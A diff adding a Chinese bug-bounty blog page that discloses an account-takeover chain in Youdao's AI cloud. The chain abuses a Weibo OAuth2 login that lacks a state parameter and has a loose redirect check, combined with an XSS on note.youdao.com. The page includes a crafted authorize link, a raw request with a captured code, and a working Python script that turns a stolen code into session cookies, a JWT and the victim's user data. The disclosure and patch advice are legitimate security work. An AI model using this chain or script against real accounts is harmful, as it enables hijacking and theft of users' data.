@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!) | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" />
+<meta property="og:url" content="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-09T10:26:18+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-09T10:26:18+08:00","datePublished":"2024-04-09T10:26:18+08:00","description":"Name","headline":"高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"},"url":"http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-09T10:26:18+08:00" itemprop="datePublished">Apr 9, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>account takeover</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>High, 9.5</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>
+    <p>POC网页: <a href="https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###">https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</a></p>
+  </li>
+  <li>
+    <p>视频链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a> 提取码：1314</p>
+  </li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<p>OAuth2登录请求，其中code参数是攻击者截获的微博认证code：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
+Host: ai.youdao.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://api.weibo.com/
+Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+
+<p>网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：</p>
+
+<ol>
+  <li>用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。</li>
+  <li>当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。</li>
+  <li>攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。</li>
+</ol>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：<a href="https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225">https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</a></p>
+
+    <p><img src="/assets/youdaoai/xiezuo.png" alt="xiezuo" /></p>
+
+    <p><img src="/assets/youdaoai/xiezuoxss.png" alt="xiezuoxss" /></p>
+  </li>
+  <li>
+    <p>受害者：注册网易有道智云平台账号，<a href="https://ai.youdao.com/login.s">https://ai.youdao.com/login.s</a>。并且进入账号设置，绑定微博账号。</p>
+
+    <p>登录和注册：</p>
+
+    <p><img src="/assets/youdaoai/register.png" alt="reg" /></p>
+
+    <p>微博绑定：</p>
+
+    <p><img src="/assets/youdaoai/weibo.png" alt="weibo" /></p>
+  </li>
+  <li>
+    <p>攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。</p>
+
+    <p>微博登录入口：</p>
+
+    <p><img src="/assets/youdaoai/weibodenglu.png" alt="weibod" /></p>
+
+    <p>微博扫码登录界面：</p>
+
+    <p><img src="/assets/youdaoai/weiboauth.png" alt="weiboa" /></p>
+
+    <p>分析微博验证界面的url链接：</p>
+
+    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&amp;forcelogin=true###</p>
+
+    <p>可以看到OAuth2的返回token是<code class="language-plaintext highlighter-rouge">code</code>类型，<code class="language-plaintext highlighter-rouge">redirect_uri</code>指向<code class="language-plaintext highlighter-rouge">https://ai.youdao.com/login-weibo-redirect.s</code>，未提供<code class="language-plaintext highlighter-rouge">state</code>参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。</p>
+  </li>
+  <li>
+    <p>笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。</p>
+
+    <p>youdao.com域名下的xss漏洞链接：</p>
+
+    <p>https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</p>
+
+    <p>将上述链接urlencode后替换redirect_uri值：</p>
+
+    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</p>
+
+    <p>打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：</p>
+
+    <p><img src="/assets/youdaoai/redirect.png" alt="re" /></p>
+
+    <p>跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：</p>
+
+    <p><img src="/assets/youdaoai/weibotoken.png" alt="xss" /></p>
+
+    <p><img src="/assets/youdaoai/webhook2.png" alt="webhook" /></p>
+  </li>
+  <li>
+    <p>攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:</p>
+
+    <p>第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 <code class="language-plaintext highlighter-rouge">JSESSIONID_NEW</code> cookie作为session cookie。</p>
+
+    <p><img src="/assets/youdaoai/sessioncookie.png" alt="sess" /></p>
+
+    <p>第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s</p>
+
+    <p><img src="/assets/youdaoai/loginweibo.png" alt="login" /></p>
+
+    <p>第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。</p>
+
+    <p><img src="/assets/youdaoai/getjwt.png" alt="getjwt" /></p>
+
+    <p>第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。</p>
+
+    <p><img src="/assets/youdaoai/getuserinfo.png" alt="getuser" /></p>
+  </li>
+  <li>
+    <p>为自动化上述过程，笔者提供自动化脚本供测试：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import requests
+ import sys
+
+ weiboCode= "weibo_code"
+ # 1. login-weibo-redirect.s
+ url = "https://ai.youdao.com/login-weibo-redirect.s?code="
+ payload = {}
+ headers = {
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+ 'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
+ }
+ response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
+ cookies = response.headers['Set-Cookie']
+
+ JSESSIONID_NEW = None
+ if cookies:
+     cookie_strings = cookies.split(';')
+     for cookie_string in cookie_strings:
+         cookie_parts = cookie_string.strip().split('=')
+         if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
+             JSESSIONID_NEW = cookie_parts[1]
+             print("Cookie Value:", JSESSIONID_NEW)
+             break
+
+ if not JSESSIONID_NEW:
+     print("no JSESSIONID_NEW found")
+     sys.exit()
+
+ print("################get JSESSIONID_NEW###############")
+ print(JSESSIONID_NEW)
+
+
+ # 2. login-weibo.s 
+ url = "https://ai.youdao.com/login-weibo.s"
+
+ payload = {}
+ headers = {
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
+ 'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
+ 'Origin': 'https://ai.youdao.com',
+ 'Sec-Fetch-Site': 'same-origin'
+ }
+ response = requests.request("POST", url, headers=headers, data=payload)
+
+ # /consoleApi/ABTest/checkUser
+ url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
+ payload = {}
+ response = requests.request("GET", url, headers=headers, data=payload)
+ Authorization = response.headers['Authorization']
+ print("################Authorization###############")
+ print(Authorization)
+
+ # /consoleApi/user/getUserInfo
+ url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
+ payload = {}
+ response = requests.request("POST", url, headers=headers, data=payload)
+ print("################getUserInfo###############")
+ print(response.text)
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a>
+提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
+</ol>
+
+
+  </div><a class="u-url" href="/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
